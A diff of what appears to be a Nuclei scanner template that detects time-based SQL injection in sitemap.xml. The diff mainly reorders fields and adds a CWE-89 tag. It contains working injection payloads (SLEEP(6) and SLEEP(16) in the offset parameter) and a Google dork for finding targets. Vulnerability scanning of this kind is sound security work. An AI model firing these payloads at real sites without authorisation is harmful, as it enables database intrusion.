@@ -1,5 +1,4 @@
 id: sitemap-sql-injection
-
 info:
   name: Sitemap - SQL Injection
   author: Aravind,j4vaovo
@@ -7,13 +6,29 @@ info:
   description: Sitemap is vulnerable to SQL Injection.
   reference:
     - https://twitter.com/GodfatherOrwa/status/1647406811216072705?t=fbn0Eu34euKdrn4fL8UqfQ&s=19
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    max-request: 2
     google-query: intext:"sitemap" filetype:txt, filetype:xml inurl:sitemap
-  tags: time-based-sqli,misconfig,sitemap,sqli,vuln
-
+    max-request: 2
+  tags: misconfig,sitemap,sqli,time-based-sqli,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - duration_1>=6
+          - status_code_1 == 200
+          - contains(body_1, "sitemap>")
+        type: dsl
+      - condition: and
+        dsl:
+          - duration_2>=16
+          - status_code_2 == 200
+          - contains(body_2, "sitemap>")
+        type: dsl
+    matchers-condition: and
+    raw:
       - |
         @timeout: 15s
         POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(6)),1,2356)# HTTP/1.1
@@ -22,20 +37,3 @@ http:
         @timeout: 25s
         POST /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)# HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration_1>=6'
-          - 'status_code_1 == 200'
-          - 'contains(body_1, "sitemap>")'
-        condition: and
-
-      - type: dsl
-        dsl:
-          - 'duration_2>=16'
-          - 'status_code_2 == 200'
-          - 'contains(body_2, "sitemap>")'
-        condition: and
-
